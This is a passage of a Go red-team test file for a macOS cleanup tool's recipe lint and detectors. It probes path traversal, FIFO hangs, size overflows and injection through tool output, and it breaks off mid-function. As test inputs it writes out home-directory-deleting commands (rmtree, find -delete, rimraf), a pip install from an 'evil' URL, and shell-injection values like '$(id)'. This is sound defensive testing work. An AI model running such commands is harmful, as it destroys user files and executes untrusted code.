package tests

// P3-R1 red-team tests for the recipe catalog and detectors.
//
// Tests that fail with "BUG:" demonstrate a finding (see .task/REPORT.md).
// The others document attacks that held up and must keep passing.

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"math"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/sagnik26/macdoc/internal/recipes"

	"github.com/sagnik26/macdoc/internal/model"
	"github.com/sagnik26/macdoc/internal/platform"
	"github.com/sagnik26/macdoc/internal/safety"
	"github.com/sagnik26/macdoc/internal/testutil/fstree"
)

// ---- helpers ----

// r1Native returns a valid native recipe with the given argv.
func r1Native(argv ...string) recipes.Recipe {
	r := validRecipe()
	r.Method, r.Allow, r.Native = model.MethodNative, nil, &recipes.Native{Argv: argv}
	return r
}

// r1Home is a canonical temp home with the Android environment cleared.
func r1Home(t *testing.T) string {
	t.Helper()
	return androidHome(t)
}

// r1Run runs catalog recipe id's detector with env (Now defaults to w2Now).
func r1Run(t *testing.T, id string, env recipes.Env) ([]recipes.Finding, error) {
	t.Helper()
	r := w2Recipe(t, id)
	d, ok := recipes.Lookup(r.Detector)
	if !ok {
		t.Fatalf("detector %s not registered", r.Detector)
	}
	if env.Now.IsZero() {
		env.Now = w2Now
	}
	return d(context.Background(), env, r)
}

// r1AllTools makes every tool look installed.
func r1AllTools(t *testing.T) {
	t.Helper()
	old := recipes.ToolInstalled
	recipes.ToolInstalled = func(string) bool { return true }
	t.Cleanup(func() { recipes.ToolInstalled = old })
}

// r1Fixtures are the real/assumed listing outputs keyed by command.
func r1Fixtures(t *testing.T) map[string]platform.Result {
	t.Helper()
	return map[string]platform.Result{
		"brew cleanup -n --prune=all":                        {Stdout: readFixture(t, "brew_cleanup_n.txt")},
		"brew autoremove -n":                                 {Stdout: readFixture(t, "w2_brew_autoremove_n.txt")},
		"docker system df --format {{json .}}":               {Stdout: readFixture(t, "w2_docker_system_df.txt")},
		"docker images -f dangling=true --format {{json .}}": {Stdout: readFixture(t, "w2_docker_dangling.txt")},
		"xcrun simctl list -j devices":                       {Stdout: readFixture(t, "w1_simctl_devices.json")},
		"xcrun simctl runtime list -j":                       {Stdout: readFixture(t, "w1_simctl_runtime_list.json")},
		"xcrun --find simctl":                                {Stdout: []byte("/usr/bin/simctl\n")},
		"tmutil listlocalsnapshots /":                        {Stdout: readFixture(t, "w2_tmutil_snapshots.txt")},
		"tmutil destinationinfo":                             {Stdout: []byte("Name : Backup\nMount Point : /nonexistent\n")},
		"conda clean --all --dry-run":                        {Stdout: readFixture(t, "w2_conda_clean_dry_run.txt")},
		"ollama list":                                        {Stdout: readFixture(t, "w2_ollama_list.txt")},
	}
}

// r1ReadOnlyCommands is the complete set of commands a detector may run.
var r1ReadOnlyCommands = []string{
	"brew cleanup -n --prune=all",
	"brew autoremove -n",
	"docker system df --format {{json .}}",
	"docker images -f dangling=true --format {{json .}}",
	"xcrun simctl list -j devices",
	"xcrun simctl runtime list -j",
	"xcrun --find simctl",
	"tmutil listlocalsnapshots /",
	"tmutil destinationinfo",
	"conda clean --all --dry-run",
	"ollama list",
}

// r1Snapshot records every entry under root (name, mode, size, mtime).
func r1Snapshot(t *testing.T, root string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		fi, err := os.Lstat(p)
		if err != nil {
			return err
		}
		out[p] = fmt.Sprintf("%v %d %d", fi.Mode(), fi.Size(), fi.ModTime().UnixNano())
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// r1WithTimeout runs f and reports whether it finished within d.
func r1WithTimeout(d time.Duration, f func()) bool {
	done := make(chan struct{})
	go func() {
		defer close(done)
		f()
	}()
	select {
	case <-done:
		return true
	case <-time.After(d):
		return false
	}
}

// r1Fifo creates a named pipe at p and returns a func that unblocks any
// reader (open for write, then close) so leaked goroutines finish.
func r1Fifo(t *testing.T, p string) func() {
	t.Helper()
	mkdir(t, filepath.Dir(p))
	if err := syscall.Mkfifo(p, 0o644); err != nil {
		t.Skipf("mkfifo: %v", err)
	}
	return func() {
		if w, err := os.OpenFile(p, os.O_WRONLY|syscall.O_NONBLOCK, 0); err == nil {
			_ = w.Close()
		}
	}
}

// ---- R1-01..05, R1-13: lint bypasses (recipes.Validate / lintArgv / lintPattern) ----

// R1-01: lintArgv is a deny-list. Every NativeTool has a subcommand that runs
// arbitrary code or deletes arbitrary paths, and none of these argvs contain
// a forbidden element or shell character.
func TestR1LintAllowsArbitraryExecution(t *testing.T) {
	for _, argv := range [][]string{
		{"xcrun", "python3", "-c", "__import__('shutil').rmtree('/Users/me/Documents')"},
		{"xcrun", "/bin/rm", "-r", "-f", "/Users/me/Documents"},
		{"brew", "ruby", "-e", "FileUtils.rm_r(Dir.home)"},
		{"uv", "run", "python", "-c", "__import__('shutil').rmtree('/Users/me')"},
		{"conda", "run", "python", "-c", "__import__('shutil').rmtree('/Users/me')"},
		{"pyenv", "exec", "python", "-c", "__import__('shutil').rmtree('/Users/me')"},
		{"npm", "exec", "--yes", "rimraf", "/Users/me/Documents"},
		{"pnpm", "dlx", "rimraf", "/Users/me/Documents"},
		{"docker", "run", "--rm", "-v", "/Users/me:/h", "alpine", "find", "/h", "-delete"},
		{"pip3", "install", "https://example.com/evil.tar.gz"},
	} {
		if recipes.Validate(r1Native(argv...)) == nil {
			t.Errorf("BUG: lint accepts arbitrary-execution argv %q", argv)
		}
	}
}

// R1-02: volume-affecting docker commands other than "system prune --volumes"
// pass the lint (SAFETY_MODEL §5: "Volume-affecting flags are forbidden by a
// recipe lint rule"; §3: Docker volumes are advise-only).
func TestR1LintAllowsDockerVolumeDeletion(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "volume", "prune", "-f"},
		{"docker", "volume", "prune", "-a", "-f"},
		{"docker", "volume", "rm", "{id}"}, // held: "rm" is forbidden
		{"docker", "compose", "down", "-v"},
		{"docker", "container", "prune", "-f", "--filter", "label=x"}, // control: legit, not asserted
	} {
		err := recipes.Validate(r1Native(argv...))
		if slices.Contains(argv, "label=x") {
			continue
		}
		if err == nil {
			t.Errorf("BUG: lint accepts volume-deleting argv %q", argv)
		}
	}
}

// R1-03: dry_run_argv is linted like argv but never checked to be a dry run,
// and the brew/conda detectors run it through the Runner during detection.
// A catalog typo (e.g. a missing -n) would make `macdoc scan`/`wins` mutate
// the system outside internal/executor.
func TestR1DryRunArgvNotCheckedAndExecutedByDetector(t *testing.T) {
	r := w2Recipe(t, "brew.cleanup")
	r.Native = &recipes.Native{Argv: []string{"brew", "cleanup", "--prune=all"}, DryRunArgv: []string{"brew", "cleanup", "--prune=all"}}
	if recipes.Validate(r) == nil {
		t.Error("BUG: lint accepts a dry_run_argv identical to the mutating argv")
	}
	r2 := r1Native("brew", "cleanup")
	r2.Native.DryRunArgv = []string{"brew", "uninstall", "{id}"}
	if recipes.Validate(r2) == nil {
		t.Error("BUG: lint accepts a dry_run_argv with no dry-run flag (and an {id} that is never substituted)")
	}

	r1AllTools(t)
	runner := &platform.Fake{Responses: map[string]platform.Result{"brew cleanup --prune=all": {}}}
	// P3-W4 D2: recipes.RunDryRun refuses an argv outside the dry-run allow-list,
	// so the detector now returns an error instead of running it.
	if _, err := recipes.DetectBrewCleanup(context.Background(), recipes.Env{Home: w2Home, Runner: runner, Now: w2Now}, r); err == nil {
		t.Error("detector accepted a non-dry-run argv")
	}
	for _, c := range runner.Calls {
		if !slices.Contains(r1ReadOnlyCommands, platform.Key(c)) {
			t.Errorf("BUG: detector ran non-dry-run command %q from the recipe", platform.Key(c))
		}
	}
}

// R1-04: SAFETY_MODEL §5 says "Recipe validation rejects globs that resolve
// to protected roots". lintPattern only checks shape and depth.
func TestR1LintAllowsProtectedPatterns(t *testing.T) {
	for _, p := range []string{
		"~/Documents/*",
		"~/DOCUMENTS/*",   // case
		"~/[D]ocuments/*", // glob class
		"~/D?cuments/*",   // single-char wildcard
		"~/Desktop/**/x",  // ** under a protected root
		"~/*/*",           // matches ~/Documents/x, ~/Desktop/x, …
		"~/*/**/*",        // anything 2+ deep
		"~/Library/*",     // ~/Library/Keychains, ~/Library/Mail, …
		"~/.ssh/*",        // credentials
		"~/Library/Mobile Documents/*",
		"~/Library/Application Support/*", // parent of MobileSync/Backup and macdoc state
		"~/Library/Containers/com.apple.Notes",
		"~/code/**/.git",
		"~/code/**/*.sqlite",
	} {
		r := validRecipe()
		r.Allow = []string{p}
		if recipes.Validate(r) == nil {
			t.Errorf("BUG: lint accepts allow pattern %q, which can match a protected path", p)
		}
	}
}

// R1-05: subcommands that remove everything a tool owns (not one listed
// item) or edit user projects pass the lint.
func TestR1LintAllowsDestructiveSubcommands(t *testing.T) {
	for _, argv := range [][]string{
		{"xcrun", "simctl", "erase", "all"},
		{"xcrun", "simctl", "delete", "all"},
		{"pod", "deintegrate"},
		{"brew", "uninstall", "--force", "--ignore-dependencies", "{id}"},
		{"npm", "uninstall", "-g", "{id}"},
		{"conda", "env", "remove", "-n", "{id}"},
		{"pyenv", "uninstall", "-f", "{id}"},
		{"sdkmanager", "--uninstall", "platform-tools"},
	} {
		if recipes.Validate(r1Native(argv...)) == nil {
			t.Errorf("BUG: lint accepts destructive argv %q", argv)
		}
	}
}

// R1-13: precondition arguments may start with "-" or contain shell
// characters; only "/" and "\n" are rejected. Whatever checks
// app_not_running:<arg> in Phase 5 will receive them.
func TestR1LintPreconditionArgs(t *testing.T) {
	for _, pc := range []string{"app_not_running:-f", "app_not_running:--help", "app_not_running:Xcode;id", "app_not_running:$(id)", "app_not_running:\t", "app_not_running:a\rb"} {
		r := validRecipe()
		r.Preconditions = []string{pc}
		if recipes.Validate(r) == nil {
			t.Errorf("BUG: lint accepts precondition %q", pc)
		}
	}
}

// Held: the lint rejects these argv tricks.
func TestR1LintArgvHeld(t *testing.T) {
	for _, argv := range [][]string{
		{"docker", "system", "prune", "-a"},
		{"docker", "--context", "x", "system", "prune"},
		{"docker", "system", "prune", "--volumes=true"},
		{"docker", "builder", "prune", "--volumes"},
		{"docker", "rm", "-f", "{id}"},
		{"docker", "image", "rm", "{id}"},
		{"docker", "container", "rm", "{id}"},
		{"ollama", "run", "rm"},
		{"ollama", "list", "rm"},
		{"brew", "rm", "{id}"},
		{"brew", "sh"},
		{"brew", "bash"},
		{"xcrun", "sudo", "x"},
		{"xcrun", "zsh"},
		{"xcrun", "rm", "-rf", "/"},
		{"brew", "{id}", "{id}"},
		{"brew", "--x={id}"},
		{"brew", "a`id`"},
		{"brew", "a\nb"},
		{"brew", "a|b"},
		{"brew", "a&b"},
		{"brew", "a>b"},
		{"/bin/rm", "x"},
		{"./brew", "x"},
		{"Brew", "x"},
		{"env", "brew"},
		{"sudo", "brew"},
	} {
		if recipes.Validate(r1Native(argv...)) == nil {
			t.Errorf("lint accepts %q", argv)
		}
	}
	// A legitimate "rm" subcommand only for ollama, and only at argv[1].
	if err := recipes.Validate(r1Native("ollama", "rm", "{id}")); err != nil {
		t.Errorf("ollama rm rejected: %v", err)
	}
}

// Held: allow pattern shape tricks.
func TestR1LintPatternHeld(t *testing.T) {
	for _, p := range []string{
		"~/*", "~/**", "~/**/*", "~/**/node_modules", "~/*/**", "~/./a/b", "~/a/./b",
		"~/a/../b/c", "~/a//b", "~/a/b/", "/Users/me/a/b", "~user/a/b", "~", "~/",
		"~/a/[b", "a/b/c", "", "~/**/**/x",
	} {
		r := validRecipe()
		r.Allow = []string{p}
		if recipes.Validate(r) == nil {
			t.Errorf("lint accepts allow pattern %q", p)
		}
	}
}

// ---- R1-06, R1-07: Android AVD registry ----

// R1-06: the AVD registry's path= decides which directory avdmanager deletes
// for `avdmanager delete avd -n <name>`. android_avds trusts any absolute
// path=, so a registry entry pointing into ~/Documents yields a native
// finding whose action removes a protected directory. recipes.Native targets are not
// CheckTarget'ed.
func TestR1AVDPathIntoProtectedDir(t *testing.T) {
	home := r1Home(t)
	avdDir := filepath.Join(home, ".android/avd")
	victim := filepath.Join(home, "Documents/thesis")
	writeFile(t, filepath.Join(victim, "chapter1.tex"), "x")
	writeFile(t, filepath.Join(avdDir, "Pixel.ini"), "avd.ini.encoding=UTF-8\npath="+victim+"\n")
	nodes := fakeNodes{{Path: victim, Bytes: 5 << 30, MtimeMax: w2DaysAgo(400)}}
	withTools(t, "avdmanager")

	fs, err := r1Run(t, "android.avd", recipes.Env{Home: home, Nodes: nodes})
	if err != nil {
		t.Fatal(err)
	}
	pol, err := safety.NewPolicy(home, nil)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		c, _ := safety.Canonicalize(f.Target)
		if prot, root := pol.IsProtected(c); prot {
			t.Errorf("BUG: android.avd emits %q (protected: %s) with NativeArg %q; avdmanager delete would remove it", f.Target, root, f.NativeArg)
		} else if !safety.Within(filepath.Join(home, ".android/avd"), c) {
			t.Errorf("BUG: android.avd target %q is outside the AVD home", f.Target)
		}
	}
	// Same registry entry also points the snapshot recipe at the victim.
	writeFile(t, filepath.Join(victim, "snapshots/s1"), "x")
	nodes = append(nodes, model.Node{Path: victim + "/snapshots", Bytes: 1 << 30})
	fs, err = r1Run(t, "android.avd_snapshots", recipes.Env{Home: home, Nodes: nodes})
	if err != nil {
		t.Fatal(err)
	}
	r := w2Recipe(t, "android.avd_snapshots")
	for _, f := range fs {
		if err := pol.CheckTarget(f.Target, r.Allow); err != nil {
			t.Errorf("BUG (defense in depth): android.avd_snapshots emits %q: %v", f.Target, err)
		}
	}
}

// R1-07a: config.ini is read with os.ReadFile without checking it is a
// regular file. A FIFO (or a symlink to /dev/zero, which would grow without
// bound) hangs every Android AVD detector.
func TestR1AVDConfigFifoHangs(t *testing.T) {
	home := r1Home(t)
	avdDir := filepath.Join(home, ".android/avd")
	data := filepath.Join(avdDir, "Pixel.avd")
	writeFile(t, filepath.Join(avdDir, "Pixel.ini"), "path="+data+"\n")
	unblock := r1Fifo(t, filepath.Join(data, "config.ini"))
	t.Cleanup(unblock)
	ok := r1WithTimeout(2*time.Second, func() {
		_, _ = r1Run(t, "android.avd_snapshots", recipes.Env{Home: home, Nodes: fakeNodes{}})
	})
	unblock()
	if !ok {
		t.Error("BUG: android detectors hang reading a FIFO config.ini")
	}
}

// R1-07b: the same for nvm alias files.
func TestR1NvmAliasFifoHangs(t *testing.T) {
	home := r1Home(t)
	vers := filepath.Join(home, ".nvm/versions/node")
	nodes := fakeNodes{
		{Path: vers + "/v18.0.0", Bytes: 100},
		{Path: vers + "/v20.0.0", Bytes: 100},
		{Path: vers + "/v22.0.0", Bytes: 100},
	}
	unblock := r1Fifo(t, filepath.Join(home, ".nvm/alias/default"))
	t.Cleanup(unblock)
	ok := r1WithTimeout(2*time.Second, func() {
		_, _ = r1Run(t, "nvm.old_versions", recipes.Env{Home: home, Nodes: nodes})
	})
	unblock()
	if !ok {
		t.Error("BUG: nvm_old_versions hangs reading a FIFO alias file")
	}
}

// Held: hostile AVD names and image.sysdir values.
func TestR1AVDHostileInputsHeld(t *testing.T) {
	home := r1Home(t)
	avdDir := filepath.Join(home, ".android/avd")
	sdk := filepath.Join(home, "Library/Android/sdk")
	img := filepath.Join(sdk, "system-images/android-34/google_apis/arm64-v8a")
	mkdir(t, img)
	var nodes fakeNodes
	for _, name := range []string{"-n", "--all", "a b", "x;id", "$(id)", "..", "a\tb"} {
		d := filepath.Join(avdDir, "safe"+fmt.Sprint(len(nodes))+".avd")
		writeFile(t, filepath.Join(avdDir, name+".ini"), "path="+d+"\n")
		writeFile(t, filepath.Join(d, "config.ini"), "image.sysdir.1=../../../../\n")
		nodes = append(nodes, model.Node{Path: d, Bytes: 1 << 30, MtimeMax: w2DaysAgo(400)})
	}
	withTools(t, "avdmanager")
	fs, err := r1Run(t, "android.avd", recipes.Env{Home: home, Nodes: nodes})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if !recipes.ValidNativeArg(f.NativeArg) {
			t.Errorf("unsafe NativeArg %q", f.NativeArg)
		}
	}
	if _, err := r1Run(t, "android.system_images_unused", recipes.Env{Home: home, Nodes: nodes}); err != nil {
		t.Fatal(err)
	}
}

// ---- R1-08, R1-09: sizes ----

// R1-08a: recipes.ParseSize converts float64 to int64 without a range check. Values
// beyond int64 are implementation-defined in Go (MinInt64 on amd64,
// saturated MaxInt64 on arm64), and are accepted as tool-reported sizes.
func TestR1ParseSizeOverflow(t *testing.T) {
	for _, s := range []string{"99999999999TB", "1" + strings.Repeat("0", 400) + "B", "9223372036854775808"} {
		if b, ok := recipes.ParseSize(s, 1024); ok {
			t.Errorf("BUG: recipes.ParseSize(%q) = %d, accepted (out of int64 range)", s, b)
		}
	}
}

// R1-08b: brew's "would free approximately …" with an absurd value becomes a
// tool-reported size.
func TestR1BrewAbsurdSize(t *testing.T) {
	r1AllTools(t)
	out := "Would remove: /x (1KB)\n==> This operation would free approximately 99999999999TB of disk space.\n"
	fs, err := r1Run(t, "brew.cleanup", recipes.Env{Home: w2Home, Runner: w2Fake(map[string]platform.Result{"brew cleanup -n --prune=all": {Stdout: []byte(out)}})})
	if err != nil || len(fs) != 1 {
		t.Fatalf("got %+v, %v", fs, err)
	}
	if b := fs[0].Bytes; b.Source != model.SourceUnknown && (b.Value <= 0 || b.Value == math.MaxInt64) {
		t.Errorf("BUG: brew.cleanup reports %d bytes (%s) for an absurd size", b.Value, b.Source)
	}
	// Held: unknown unit (PB) and a missing summary stay unknown, never 0.
	for _, o := range []string{"Would remove: /x\n==> This operation would free approximately 3PB of disk space.\n", "Would remove: /x\n"} {
		fs, err := r1Run(t, "brew.cleanup", recipes.Env{Home: w2Home, Runner: w2Fake(map[string]platform.Result{"brew cleanup -n --prune=all": {Stdout: []byte(o)}})})
		if err != nil || len(fs) != 1 || fs[0].Bytes.Source != model.SourceUnknown {
			t.Errorf("%q: got %+v, %v", o, fs, err)
		}
	}
}

// R1-08c: per-row sizes are summed without overflow checks.
func TestR1DockerDanglingSumOverflows(t *testing.T) {
	r1AllTools(t)
	row := `{"ID":"sha256:a","Size":"9000000TB"}` + "\n"
	runner := w2Fake(map[string]platform.Result{"docker images -f dangling=true --format {{json .}}": {Stdout: []byte(row + row)}})
	fs, err := r1Run(t, "docker.dangling_images", recipes.Env{Home: w2Home, Runner: runner})
	if err != nil || len(fs) != 1 {
		t.Fatalf("got %+v, %v", fs, err)
	}
	if b := fs[0].Bytes; b.Source != model.SourceUnknown && b.Value < 0 {
		t.Errorf("BUG: docker.dangling_images total overflowed to %d (%s)", b.Value, b.Source)
	}
}

func TestR1SimctlUnavailableSumOverflows(t *testing.T) {
	r1AllTools(t)
	js := `{"devices":{"com.apple.CoreSimulator.SimRuntime.iOS-16-0":[
	 {"udid":"A","name":"a","state":"Shutdown","isAvailable":false,"dataPathSize":9000000000000000000},
	 {"udid":"B","name":"b","state":"Shutdown","isAvailable":false,"dataPathSize":9000000000000000000}]}}`
	runner := w2Fake(map[string]platform.Result{"xcrun simctl list -j devices": {Stdout: []byte(js)}})
	fs, err := r1Run(t, "xcode.simulators_unavailable", recipes.Env{Home: w2Home, Runner: runner, Nodes: fakeNodes{}})
	if err != nil || len(fs) != 1 {
		t.Fatalf("got %+v, %v", fs, err)
	}
	if b := fs[0].Bytes; b.Source != model.SourceUnknown && b.Value < 0 {
		t.Errorf("BUG: xcode.simulators_unavailable total overflowed to %d (%s)", b.Value, b.Source)
	}
}

// R1-09: the unavailable-simulators detector joins an unvalidated UDID into
// a path to size it. A UDID with ".." sizes an arbitrary directory (here
// ~/Documents) as reclaimable simulator data.
func TestR1SimctlUnavailableUDIDTraversal(t *testing.T) {
	r1AllTools(t)
	js := `{"devices":{"com.apple.CoreSimulator.SimRuntime.iOS-16-0":[
	 {"udid":"../../../../Documents","name":"x","state":"Shutdown","isAvailable":false}]}}`
	runner := w2Fake(map[string]platform.Result{"xcrun simctl list -j devices": {Stdout: []byte(js)}})
	nodes := fakeNodes{{Path: w2Home + "/Documents", Bytes: 200 << 30}}
	fs, err := r1Run(t, "xcode.simulators_unavailable", recipes.Env{Home: w2Home, Runner: runner, Nodes: nodes})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if f.Bytes.Value == 200<<30 {
			t.Errorf("BUG: a UDID with .. made ~/Documents (%d bytes) count as unavailable simulator data", f.Bytes.Value)
		}
	}
}

// ---- simctl / ollama / docker hostile listings (held) ----

func TestR1SimctlHostileIdentifiersHeld(t *testing.T) {
	r1AllTools(t)
	long := strings.Repeat("a", 300)
	ids := []string{"--all", "-rf", "a b", "../x", "x/y", "x\ny", "$(id)", "x;y", long, "", "all"}
	var b strings.Builder
	b.WriteString("{")
	for i, id := range ids {
		fmt.Fprintf(&b, `%q:{"identifier":%q,"version":"17.%d","runtimeIdentifier":"com.apple.CoreSimulator.SimRuntime.iOS-17-%d","deletable":true,"sizeBytes":10},`, id, id, i, i)
	}
	// Key/identifier mismatch, deletable missing, deletable false.
	b.WriteString(`"GOOD-1":{"identifier":"--all","version":"1","deletable":true},`)
	b.WriteString(`"GOOD-2":{"identifier":"GOOD-2","version":"1"},`)
	b.WriteString(`"GOOD-3":{"identifier":"GOOD-3","version":"1","deletable":false},`)
	b.WriteString(`"NULL":null}`)
	runner := w2Fake(map[string]platform.Result{"xcrun simctl runtime list -j": {Stdout: []byte(b.String())}})
	fs, err := r1Run(t, "xcode.sim_runtimes", recipes.Env{Home: w2Home, Runner: runner})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if f.NativeArg != "all" {
			t.Errorf("unexpected runtime finding NativeArg %q", f.NativeArg)
		}
	}

	// Idle devices: hostile UDIDs never become NativeArgs.
	var devs []string
	var nodes fakeNodes
	for _, id := range ids {
		devs = append(devs, fmt.Sprintf(`{"udid":%q,"name":"n","state":"Shutdown","isAvailable":true}`, id))
		nodes = append(nodes, model.Node{Path: recipes.SimDeviceDir(recipes.Env{Home: w2Home}, id), Bytes: 1 << 30, MtimeMax: w2DaysAgo(400)})
	}
	js := `{"devices":{"com.apple.CoreSimulator.SimRuntime.iOS-17-0":[` + strings.Join(devs, ",") + `]}}`
	runner = w2Fake(map[string]platform.Result{"xcrun simctl list -j devices": {Stdout: []byte(js)}})
	fs, err = r1Run(t, "xcode.sim_devices_idle", recipes.Env{Home: w2Home, Runner: runner, Nodes: nodes})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if !recipes.ValidNativeArg(f.NativeArg) || strings.HasPrefix(f.NativeArg, "-") {
			t.Errorf("unsafe device NativeArg %q", f.NativeArg)
		}
	}
}

func TestR1OllamaHostileNamesHeld(t *testing.T) {
	r1AllTools(t)
	out := "NAME ID SIZE MODIFIED\n" +
		"-rf a1 1 GB 2 days ago\n" +
		"--help a2 1 GB 2 days ago\n" +
		"x;y a3 1 GB 2 days ago\n" +
		"$(id) a4 1 GB 2 days ago\n" +
		"`id` a5 1 GB 2 days ago\n" +
		"../x a6 1 GB 2 days ago\n" +
		"hf.co/u/m:Q4 a7 1 GB 2 days ago\n" +
		"name\rother a8 1 GB 2 days ago\n" +
		"ok:latest a9 99999999999TB 2 days ago\n" +
		"\x00 b 1 GB x\n" +
		strings.Repeat("z", 100000) + " id 1 GB x\n"
	runner := w2Fake(map[string]platform.Result{"ollama list": {Stdout: []byte(out)}})
	fs, err := r1Run(t, "ollama.model", recipes.Env{Home: w2Home, Runner: runner})
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range fs {
		if !recipes.OllamaNameRe.MatchString(f.NativeArg) || strings.HasPrefix(f.NativeArg, "-") || strings.ContainsAny(f.NativeArg, "/;$` \r\n") {
			t.Errorf("unsafe ollama NativeArg %q", f.NativeArg)
		}
	}
}

func TestR1DockerMalformedHeld(t *testing.T) {
	r1AllTools(t)
	for _, size := range []string{"-1GB", "NaN", "1e9B", "", "1.2.3GB", "1PB"} {
		row := fmt.Sprintf(`{"Type":"Images","TotalCount":"1","Active":"0","Size":"1GB","Reclaimable":%q}`, size)
		runner := w2Fake(map[string]platform.Result{"docker system df --format {{json .}}": {Stdout: []byte(row)}})
		fs, err := r1Run(t, "docker.unused_images", recipes.Env{Home: w2Home, Runner: runner})
		for _, f := range fs {
			if f.Bytes.Value < 0 || (f.Bytes.Value == 0 && f.Bytes.Source != model.SourceUnknown) {
				t.Errorf("size %q: %+v (err %v)", size, f.Bytes, err)
			}
		}
	}
	// Not JSON at all.
	runner := w2Fake(map[string]platform.Result{"docker system df --format {{json .}}": {Stdout: []byte("{{{\n")}})
	if _, err := r1Run(t, "docker.unused_images", recipes.Env{Home: w2Home, Runner: runner}); err == nil {
		t.Error("malformed docker df accepted")
	}
}

// ---- nvm aliases (held) ----

func TestR1NvmHostileAliasesHeld(t *testing.T) {
	home := r1Home(t)
	vers := filepath.Join(home, ".nvm/versions/node")
	nodes := fakeNodes{
		{Path: vers + "/v18.0.0", Bytes: 100},
		{Path: vers + "/v20.0.0", Bytes: 100},
		{Path: vers + "/v22.0.0", Bytes: 100},
	}
	alias := filepath.Join(home, ".nvm/alias")
	outside := filepath.Join(home, "elsewhere/v18")
	writeFile(t, outside, "18")
	for name, setup := range map[string]func(){
		"loop": func() {
			writeFile(t, alias+"/default", "a")
			writeFile(t, alias+"/a", "b")
			writeFile(t, alias+"/b", "a")
		},
		"dotdot":   func() { writeFile(t, alias+"/default", "../../elsewhere/v18") },
		"absolute": func() { writeFile(t, alias+"/default", outside) },
		"empty":    func() { writeFile(t, alias+"/default", "") },
		"missing":  func() { writeFile(t, alias+"/default", "lts/*") },
		"system":   func() { writeFile(t, alias+"/default", "system") },
	} {
		_ = os.RemoveAll(alias)
		setup()
		fs, err := r1Run(t, "nvm.old_versions", recipes.Env{Home: home, Nodes: nodes})
		if err != nil || fs != nil {
			t.Errorf("%s: unresolvable default must emit nothing, got %v, %v", name, w2Targets(fs), err)
		}
	}
	// P3-W4 D6: a symlinked alias file is never followed (recipes.ReadSmallFile
	// uses Lstat and O_NOFOLLOW). The default can't be resolved, so the
	// detector reports an error and emits nothing.
	_ = os.RemoveAll(alias)
	mkdir(t, alias)
	if err := os.Symlink(outside, alias+"/default"); err != nil {
		t.Fatal(err)
	}
	fs, err := r1Run(t, "nvm.old_versions", recipes.Env{Home: home, Nodes: nodes})
	if fs != nil || !errors.Is(err, recipes.ErrNotRegular) {
		t.Errorf("symlinked default: %v, %v", w2Targets(fs), err)
	}
}

// ---- version comparison (held) ----

func TestR1VersionOrderingHeld(t *testing.T) {
	home := w2Home
	ds := home + "/Library/Developer/Xcode/iOS DeviceSupport"
	nodes := fakeNodes{
		{Path: ds, Bytes: 10},
		{Path: ds + "/9.9 (13G36)", Bytes: 1},
		{Path: ds + "/10.0 (14A345)", Bytes: 1},
		{Path: ds + "/iPhone15,2 10.0.1 (14A403)", Bytes: 1},
		{Path: ds + "/18.0 beta (22A5282m)", Bytes: 1}, // first plain version field is 18.0
		{Path: ds + "/Unknown", Bytes: 1},
		{Path: ds + "/.DS_Store", Kind: model.NodeFile, Bytes: 1},
	}
	got := w2Targets(mustDetect(t, "xcode.device_support", recipes.Env{Home: home, Nodes: nodes}))
	want := []string{ds + "/10.0 (14A345)", ds + "/9.9 (13G36)", ds + "/iPhone15,2 10.0.1 (14A403)"}
	if !slices.Equal(got, want) {
		t.Errorf("device support = %q, want %q", got, want)
	}

	h := r1Home(t)
	bt := filepath.Join(h, "Library/Android/sdk/build-tools")
	mkdir(t, bt+"/9.0.0", bt+"/10.0.0", bt+"/35.0.0-rc1", bt+"/latest", bt+"/34.0.0")
	fs, err := r1Run(t, "android.build_tools_old", recipes.Env{Home: h, Nodes: fakeNodes{}})
	if err != nil {
		t.Fatal(err)
	}
	if got := w2Targets(fs); !slices.Equal(got, []string{bt + "/10.0.0", bt + "/9.0.0"}) {
		t.Errorf("build-tools = %q", got)
	}

	gd := w2Home + "/.gradle/wrapper/dists"
	nodes = fakeNodes{{Path: gd + "/gradle-8.9-bin", Bytes: 1}, {Path: gd + "/gradle-8.10-all", Bytes: 1}, {Path: gd + "/gradle-9.0-rc-1-bin", Bytes: 1}}
	if got := w2Targets(mustDetect(t, "gradle.wrapper_dists_old", recipes.Env{Home: w2Home, Nodes: nodes})); !slices.Equal(got, []string{gd + "/gradle-8.9-bin"}) {
		t.Errorf("gradle = %q", got)
	}
}

// ---- R1-10: overlapping findings ----

// R1-10: user.app_caches emits ~/Library/Caches/Google and user.logs emits
// ~/Library/Logs/Google, while android_studio.old_versions_data emits
// AndroidStudio* folders inside them. The same bytes are reported twice
// (invariant 10) and two quarantine items cover one tree.
func TestR1OverlappingTargets(t *testing.T) {
	home := w2Home
	var nodes fakeNodes
	for _, p := range []string{"Library/Caches", "Library/Logs", "Library/Application Support"} {
		g := home + "/" + p + "/Google"
		nodes = append(nodes,
			model.Node{Path: home + "/" + p, Bytes: 4 << 30},
			model.Node{Path: g, Bytes: 3 << 30, MtimeMax: w2DaysAgo(200)},
			model.Node{Path: g + "/AndroidStudio2023.1", Bytes: 1 << 30, MtimeMax: w2DaysAgo(200)},
			model.Node{Path: g + "/AndroidStudio2024.1", Bytes: 1 << 30, MtimeMax: w2DaysAgo(1)},
		)
	}
	c, err := recipes.Load()
	if err != nil {
		t.Fatal(err)
	}
	type tgt struct{ id, path string }
	var all []tgt
	for _, r := range c.Recipes {
		if r.Method != model.MethodQuarantine {
			continue
		}
		fs, err := r1Run(t, r.ID, recipes.Env{Home: home, Nodes: nodes})
		if err != nil {
			continue
		}
		for _, f := range fs {
			all = append(all, tgt{r.ID, f.Target})
		}
	}
	for _, a := range all {
		for _, b := range all {
			if a.path != b.path && safety.Within(a.path, b.path) {
				t.Errorf("BUG: %s target %q contains %s target %q (bytes counted twice)", a.id, a.path, b.id, b.path)
			}
